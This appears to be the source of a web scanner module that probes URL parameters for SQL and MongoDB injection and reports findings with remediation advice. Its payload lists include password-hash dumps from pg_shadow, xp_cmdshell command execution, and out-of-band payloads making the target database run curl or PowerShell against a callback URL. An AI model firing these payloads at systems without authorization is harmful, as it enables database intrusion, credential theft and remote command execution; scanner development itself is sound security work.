"""
SQL Injection & NoSQL Injection Scanner Module

Techniques covered:
  - Error-based SQLi      (55+ DBMS-specific payloads across MySQL, MSSQL, PG, Oracle, SQLite)
  - Boolean-based blind   (true/false response diffing)
  - Time-based blind      (dual-confirmed delay — requires reproducibility)
  - UNION-based           (multi-DB column enumeration)
  - NoSQL Injection       (MongoDB operator injection via JSON body)
  - OOB Blind SQLi        (HTTP callback confirmation via oob_server)
"""

import httpx
import asyncio
import time
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Tuple, Optional
from models.sqli_models import VulnerabilityFinding, ScanSummary, SeverityLevel


# ──────────────────────────────────────────────
# Payload Sets (50+ across all techniques)
# ──────────────────────────────────────────────
PAYLOADS: Dict[str, List[str]] = {
    "error_based": [
        # ── Classic quote probes ──
        "'", "''", "`", '"', "\\",
        # ── MySQL ──
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1#",
        "admin'--",
        "' OR 'x'='x",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "1' GROUP BY 1,2,3--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT @@version,NULL--",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        # ── MSSQL ──
        "1; SELECT @@version--",
        "' AND 1=CONVERT(int,@@version)--",
        "' HAVING 1=1--",
        "' GROUP BY columnnames HAVING 1=1--",
        "'; EXEC xp_cmdshell('whoami')--",
        # ── PostgreSQL ──
        "'; SELECT version()--",
        "' UNION SELECT version(),NULL--",
        "' UNION SELECT usename,passwd FROM pg_shadow--",
        "$$'; SELECT 1--$$",
        # ── Oracle ──
        "' UNION SELECT NULL FROM DUAL--",
        "' UNION SELECT banner,NULL FROM v$version--",
        "') OR ('1'='1",
        "' AND ROWNUM=1--",
        # ── SQLite ──
        "' UNION SELECT sqlite_version()--",
        "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
        "1 AND (SELECT COUNT(*) FROM sqlite_master)>0--",
    ],
    "boolean_based": [
        "' AND '1'='1", "' AND '1'='2",
        "1 AND 1=1",    "1 AND 1=2",
        "' AND 1=1--",  "' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5",
        "' AND LENGTH(database())>0--",
        "' AND LEN(@@version)>0--",
        "1 OR 1=1",     "1 OR 1=2",
        "' OR 1=1--",   "' OR 1=2--",
        "' OR 'a'='a",  "' OR 'a'='b",
    ],
    "time_based": [
        # MySQL
        "' OR SLEEP(5)--",
        "1; SELECT SLEEP(5)--",
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        # MSSQL
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'--",
        # PostgreSQL
        "'; SELECT pg_sleep(5)--",
        "' OR 1=1; SELECT pg_sleep(5)--",
        "' AND 1=CAST((SELECT pg_sleep(5)) AS INT)--",
        # Oracle
        "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5)=0--",
    ],
}

# ──────────────────────────────────────────────
# Error signatures (55+ patterns)
# ──────────────────────────────────────────────
SQL_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "supplied argument is not a valid mysql",
    "com.mysql.jdbc.exceptions",
    "org.gjt.mm.mysql",
    "mysql server version for the right syntax",
    # MSSQL
    "unclosed quotation mark",
    "incorrect syntax near",
    "microsoft sql native client error",
    "mssql_query()",
    "[sql server]",
    "odbc sql server driver",
    "sqlserver jdbc driver",
    "microsoft ole db provider for sql server",
    "conversion failed when converting",
    "operand type clash",
    "column name or number of supplied values does not match",
    # PostgreSQL
    "pg_query():",
    "pg::syntaxerror",
    "unterminated quoted string at or near",
    "postgresql",
    "psql:",
    "error: relation",
    "invalid input syntax for",
    "division by zero",
    "column does not exist",
    "function does not exist",
    # Oracle
    "ora-00933",
    "ora-00907",
    "ora-01756",
    "ora-01789",
    "ora-00932",
    "oracle error",
    "oracle driver",
    "ociexecute",
    # SQLite
    "sqlite3::query",
    "sqlite_error",
    "sqlite3.operationalerror",
    "no such table",
    "no such column",
    "unrecognized token",
    # Generic / Framework
    "sql error",
    "syntax error",
    "jdbc sqlexception",
    "odbc microsoft access driver",
    "index was outside the bounds of the array",
    "sqlexception",
    "sqlstate",
    "nativeexception",
    "javax.persistence.persistenceexception",
    "org.hibernate",
    "com.microsoft.sqlserver",
]

# ──────────────────────────────────────────────
# NoSQL (MongoDB) payloads
# ──────────────────────────────────────────────
NOSQL_OPERATOR_PARAMS = [
    # Inject these as URL param values (operator injection)
    '{"$gt":""}',
    '{"$ne":null}',
    '{"$regex":".*"}',
    '{"$exists":true}',
    '{"$where":"1==1"}',
]

NOSQL_ERROR_SIGNATURES = [
    "uncaught syntaxerror",
    "unexpected token",
    "bsontypeerror",
    "mongoing",
    "mongoclient",
    "mongoexception",
    "mongodb",
    "mongoose",
    "e11000 duplicate key",
    "casttoobjectid",
    "findone",
    "dbref",
    "no cursors",
    "invalid operator",
]

TIME_DELAY_THRESHOLD = 4.0  # seconds


# ──────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────

def extract_parameters(url: str) -> Dict[str, str]:
    """Extract query parameters from a URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return {k: v[0] for k, v in params.items()}


def inject_payload(url: str, param: str, payload: str) -> str:
    """Replace a single parameter value with a payload."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def detect_sql_error(response_text: str) -> Tuple[bool, str]:
    """Check if the response contains SQL error signatures."""
    lower = response_text.lower()
    for sig in SQL_ERROR_SIGNATURES:
        if sig in lower:
            return True, sig
    return False, ""


def detect_nosql_error(response_text: str) -> Tuple[bool, str]:
    """Check if the response contains NoSQL error signatures."""
    lower = response_text.lower()
    for sig in NOSQL_ERROR_SIGNATURES:
        if sig in lower:
            return True, sig
    return False, ""


def calculate_risk(findings: list) -> SeverityLevel:
    if not findings:
        return SeverityLevel.LOW
    severities = [f.severity for f in findings]
    if SeverityLevel.CRITICAL in severities:
        return SeverityLevel.CRITICAL
    if SeverityLevel.HIGH in severities:
        return SeverityLevel.HIGH
    if SeverityLevel.MEDIUM in severities:
        return SeverityLevel.MEDIUM
    return SeverityLevel.LOW


# ──────────────────────────────────────────────
# 1. Error-Based SQLi
# ──────────────────────────────────────────────

async def test_error_based(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    timeout: int,
    findings: list,
    errors: list,
    payloads_tested: list,
):
    """Test for error-based SQL injection."""
    for payload in PAYLOADS["error_based"]:
        payloads_tested.append(payload)
        injected_url = inject_payload(url, param, payload)
        try:
            resp = await client.get(injected_url, timeout=timeout)
            found, evidence = detect_sql_error(resp.text)
            if found:
                findings.append(VulnerabilityFinding(
                    parameter=param,
                    payload=payload,
                    evidence=f"SQL error signature detected: '{evidence}'",
                    severity=SeverityLevel.HIGH,
                    description=(
                        f"Parameter '{param}' is vulnerable to error-based SQL injection. "
                        f"The application exposed a database error when the payload was injected."
                    ),
                    remediation=(
                        "Use parameterized queries / prepared statements. "
                        "Never concatenate user input directly into SQL queries. "
                        "Implement input validation and suppress detailed error messages in production."
                    ),
                ))
                return  # One confirmed finding per param is enough
        except httpx.TimeoutException:
            errors.append(f"Timeout on param '{param}' with payload: {payload}")
        except Exception as e:
            errors.append(f"Error on param '{param}': {str(e)}")


# ──────────────────────────────────────────────
# 2. Boolean-Based Blind SQLi
# ──────────────────────────────────────────────

async def test_boolean_based(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    timeout: int,
    findings: list,
    errors: list,
    payloads_tested: list,
    baseline_length: int,
):
    """Test for boolean-based blind SQL injection by comparing response lengths."""
    true_payloads  = ["' AND '1'='1", "1 AND 1=1", "' AND 1=1--", "' OR 'a'='a"]
    false_payloads = ["' AND '1'='2", "1 AND 1=2", "' AND 1=2--", "' OR 'a'='b"]

    for true_p, false_p in zip(true_payloads, false_payloads):
        payloads_tested.extend([true_p, false_p])
        try:
            true_resp  = await client.get(inject_payload(url, param, true_p),  timeout=timeout)
            false_resp = await client.get(inject_payload(url, param, false_p), timeout=timeout)

            true_len  = len(true_resp.text)
            false_len = len(false_resp.text)
            diff = abs(true_len - false_len)

            # TRUE response must be close to baseline, FALSE must differ significantly
            baseline_diff = abs(true_len - baseline_length)
            if diff > 50 and baseline_diff < 200:
                findings.append(VulnerabilityFinding(
                    parameter=param,
                    payload=f"TRUE: {true_p} | FALSE: {false_p}",
                    evidence=(
                        f"Response length difference: TRUE={true_len} chars, "
                        f"FALSE={false_len} chars (diff={diff})"
                    ),
                    severity=SeverityLevel.HIGH,
                    description=(
                        f"Parameter '{param}' appears vulnerable to boolean-based blind SQL injection. "
                        f"The application returns different content based on true/false conditions."
                    ),
                    remediation=(
                        "Use parameterized queries / prepared statements. "
                        "Validate and sanitize all user-supplied input. "
                        "Implement a Web Application Firewall (WAF) as an additional layer."
                    ),
                ))
                return
        except httpx.TimeoutException:
            errors.append(f"Timeout on boolean test for param '{param}'")
        except Exception as e:
            errors.append(f"Error on boolean test for param '{param}': {str(e)}")


# ──────────────────────────────────────────────
# 3. Time-Based Blind SQLi (dual-confirmed)
# ──────────────────────────────────────────────

async def test_time_based(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    timeout: int,
    findings: list,
    errors: list,
    payloads_tested: list,
):
    """
    Test for time-based blind SQLi.
    Payload is sent TWICE — both must exceed the delay threshold to avoid
    false positives from slow networks or overloaded servers.
    """
    for payload in PAYLOADS["time_based"]:
        payloads_tested.append(payload)
        injected_url = inject_payload(url, param, payload)
        delays = []
        timed_out_count = 0

        for attempt in range(2):
            try:
                start = time.monotonic()
                await client.get(injected_url, timeout=max(timeout, 12))
                elapsed = time.monotonic() - start
                delays.append(elapsed)
            except httpx.TimeoutException:
                timed_out_count += 1
            except Exception as e:
                errors.append(f"Error on time-based test for param '{param}': {str(e)}")
                break

        if len(delays) == 2 and all(d >= TIME_DELAY_THRESHOLD for d in delays):
            avg_delay = sum(delays) / len(delays)
            findings.append(VulnerabilityFinding(
                parameter=param,
                payload=payload,
                evidence=(
                    f"Response delayed >{TIME_DELAY_THRESHOLD}s on both confirmation attempts "
                    f"(avg: {avg_delay:.2f}s) — reproducible time-based injection"
                ),
                severity=SeverityLevel.CRITICAL,
                description=(
                    f"Parameter '{param}' is vulnerable to time-based blind SQL injection. "
                    f"The database executed a sleep/delay function on two independent requests."
                ),
                remediation=(
                    "Immediately switch to parameterized queries / prepared statements. "
                    "Audit all database queries in the codebase. "
                    "Restrict database user permissions to minimum required."
                ),
            ))
            return

        if timed_out_count == 2:
            findings.append(VulnerabilityFinding(
                parameter=param,
                payload=payload,
                evidence=(
                    "Request timed out on both confirmation attempts — "
                    "reproducible timeout strongly indicates time-based injection"
                ),
                severity=SeverityLevel.HIGH,
                description=(
                    f"Parameter '{param}' caused reproducible timeouts with a time-delay payload. "
                    f"This is a strong indicator of time-based blind SQL injection."
                ),
                remediation=(
                    "Use parameterized queries. Investigate application logs for unusual query times."
                ),
            ))
            return


# ──────────────────────────────────────────────
# 4. OOB Blind SQLi (via callback server)
# ──────────────────────────────────────────────

async def test_oob_sqli(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    timeout: int,
    findings: list,
    errors: list,
    payloads_tested: list,
):
    """
    Test for OOB (Out-of-Band) blind SQL injection using the local callback server.
    Injects an HTTP-fetching payload; if the target's DB executes it, our server
    will receive a callback confirming blind injection.

    Works against MySQL (load_file / INTO OUTFILE), MSSQL (xp_cmdshell curl),
    and PostgreSQL (COPY TO program) in environments where outbound HTTP is allowed.
    """
    try:
        from scanners.oob_server import oob_server
        if not oob_server.is_running():
            return
    except Exception:
        return

    probe_id = oob_server.generate_probe_id()
    probe_url = oob_server.get_probe_url(probe_id)

    oob_payloads = [
        # MySQL (requires FILE privilege)
        f"' UNION SELECT LOAD_FILE('{probe_url}'),NULL--",
        f"'; SELECT LOAD_FILE('{probe_url}')--",
        # MSSQL (requires xp_cmdshell enabled)
        f"'; EXEC xp_cmdshell('curl {probe_url}')--",
        f"'; EXEC master..xp_cmdshell('powershell Invoke-WebRequest {probe_url}')--",
        # PostgreSQL
        f"'; COPY (SELECT 1) TO PROGRAM 'curl {probe_url}'--",
    ]

    for payload in oob_payloads:
        payloads_tested.append(payload)
        injected_url = inject_payload(url, param, payload)
        try:
            await client.get(injected_url, timeout=timeout)
        except Exception:
            pass

    # Wait for a callback
    hit = await oob_server.wait_for_hit(probe_id, timeout=10)
    if hit:
        hits = oob_server.get_hits(probe_id)
        findings.append(VulnerabilityFinding(
            parameter=param,
            payload="OOB HTTP callback payload",
            evidence=(
                f"OOB callback received at probe_id='{probe_id}' — "
                f"source: {hits[0].get('source_ip', 'unknown')}"
            ),
            severity=SeverityLevel.CRITICAL,
            description=(
                f"Parameter '{param}' is vulnerable to Out-of-Band blind SQL injection. "
                f"The target's database engine fetched our callback URL, confirming code execution."
            ),
            remediation=(
                "Use parameterized queries immediately. "
                "Disable xp_cmdshell (MSSQL), restrict FILE privileges (MySQL). "
                "Block outbound HTTP from your database server."
            ),
        ))
        oob_server.clear_probe(probe_id)


# ──────────────────────────────────────────────
# 5. NoSQL Injection (MongoDB)
# ──────────────────────────────────────────────

async def test_nosql_injection(
    client: httpx.AsyncClient,
    url: str,
    param: str,
    timeout: int,
    findings: list,
    errors: list,
    payloads_tested: list,
    baseline_length: int,
):
    """
    Test for NoSQL (MongoDB) operator injection.
    Tries two vectors:
      1. URL parameter value replaced with JSON operator (e.g. {"$gt":""})
      2. JSON POST body with operator-injected fields
    """
    json_headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

    # Vector 1: URL param operator injection
    for payload_str in NOSQL_OPERATOR_PARAMS:
        payloads_tested.append(payload_str)
        injected_url = inject_payload(url, param, payload_str)
        try:
            resp = await client.get(injected_url, timeout=timeout)
            found, ev = detect_nosql_error(resp.text)
            diff = abs(len(resp.text) - baseline_length)

            if found:
                findings.append(VulnerabilityFinding(
                    parameter=param,
                    payload=payload_str,
                    evidence=f"NoSQL error signature detected: '{ev}'",
                    severity=SeverityLevel.HIGH,
                    description=(
                        f"Parameter '{param}' is vulnerable to NoSQL operator injection. "
                        f"A MongoDB operator in the value triggered a database error."
                    ),
                    remediation=(
                        "Sanitize and validate all query parameters before passing to MongoDB. "
                        "Use Mongoose schema validation or explicit type casting. "
                        "Never pass raw user input as query objects."
                    ),
                ))
                return

            if resp.status_code == 200 and diff > 200:
                findings.append(VulnerabilityFinding(
                    parameter=param,
                    payload=payload_str,
                    evidence=(
                        f"NoSQL operator '{payload_str}' changed response length by {diff} bytes "
                        f"(from baseline {baseline_length} to {len(resp.text)}) — suggests query manipulation"
                    ),
                    severity=SeverityLevel.MEDIUM,
                    description=(
                        f"Parameter '{param}' may be vulnerable to NoSQL injection. "
                        f"Injecting a MongoDB operator resulted in a significantly different response."
                    ),
                    remediation=(
                        "Sanitize all user input before using in NoSQL queries. "
                        "Use allowlisting to restrict acceptable parameter types. "
                        "Apply schema validation (Mongoose, Joi, etc.)."
                    ),
                ))
                return
        except Exception as e:
            errors.append(f"NoSQL URL param test error on {param}: {str(e)}")

    # Vector 2: JSON POST body operator injection
    try:
        json_body_auth = {param: {"$ne": None}, "password": {"$ne": None}}
        resp = await client.post(url, json=json_body_auth, headers=json_headers, timeout=timeout)
        found, ev = detect_nosql_error(resp.text)
        if found or (resp.status_code == 200 and abs(len(resp.text) - baseline_length) > 200):
            findings.append(VulnerabilityFinding(
                parameter=f"{param} (JSON body)",
                payload=json.dumps(json_body_auth),
                evidence=(
                    ev or
                    f"JSON body operator injection changed response "
                    f"(diff: {abs(len(resp.text) - baseline_length)} bytes)"
                ),
                severity=SeverityLevel.HIGH,
                description=(
                    f"JSON body field '{param}' is vulnerable to NoSQL operator injection. "
                    f"Setting the field to a MongoDB comparison operator bypassed the query."
                ),
                remediation=(
                    "Never use raw JSON body fields as MongoDB query operators. "
                    "Use Mongoose schema types to cast strings before querying. "
                    "Validate that all fields are of the expected type before use."
                ),
            ))
    except Exception as e:
        errors.append(f"NoSQL JSON body test error on {param}: {str(e)}")


# ──────────────────────────────────────────────
# Main Scanner Entry Point
# ──────────────────────────────────────────────

async def run_sqli_scan(urls: List[str], timeout: int = 10) -> dict:
    """
    Run a full SQL Injection + NoSQL scan against all parameters in the given URLs.
    Returns a dict compatible with ScanResult model.
    """
    findings: List[VulnerabilityFinding] = []
    errors: List[str] = []
    payloads_tested: List[str] = []

    if isinstance(urls, str):
        urls = [urls]

    if not urls:
        return {
            "url": "none",
            "status": "completed",
            "summary": ScanSummary(
                total_parameters=0,
                total_payloads_tested=0,
                vulnerabilities_found=0,
                risk_level=SeverityLevel.LOW,
            ),
            "findings": [],
            "errors": ["No URLs provided to test."],
        }

    primary_url = urls[0]
    total_params = 0

    async with httpx.AsyncClient(follow_redirects=True) as client:
        for url in urls:
            params = extract_parameters(url)
            if not params:
                continue

            total_params += len(params)

            try:
                baseline = await client.get(url, timeout=timeout)
                baseline_length = len(baseline.text)
            except Exception as e:
                errors.append(f"Could not reach target URL {url}: {str(e)}")
                continue

            semaphore = asyncio.Semaphore(5)

            async def _test_param(p):
                async with semaphore:
                    tasks = [
                        test_error_based(client, url, p, timeout, findings, errors, payloads_tested),
                        test_boolean_based(client, url, p, timeout, findings, errors, payloads_tested, baseline_length),
                        test_time_based(client, url, p, timeout, findings, errors, payloads_tested),
                        test_nosql_injection(client, url, p, timeout, findings, errors, payloads_tested, baseline_length),
                        test_oob_sqli(client, url, p, timeout, findings, errors, payloads_tested),
                    ]
                    await asyncio.gather(*tasks)

            param_tasks = [_test_param(param) for param in params]
            await asyncio.gather(*param_tasks)

    # Deduplicate findings by (parameter, payload)
    seen = set()
    unique_findings = []
    for f in findings:
        key = (f.parameter, f.payload)
        if key not in seen:
            unique_findings.append(f)
            seen.add(key)

    summary = ScanSummary(
        total_parameters=total_params,
        total_payloads_tested=len(payloads_tested),
        vulnerabilities_found=len(unique_findings),
        risk_level=calculate_risk(unique_findings),
    )

    return {
        "url": primary_url,
        "status": "completed",
        "summary": summary,
        "findings": unique_findings,
        "errors": errors,
    }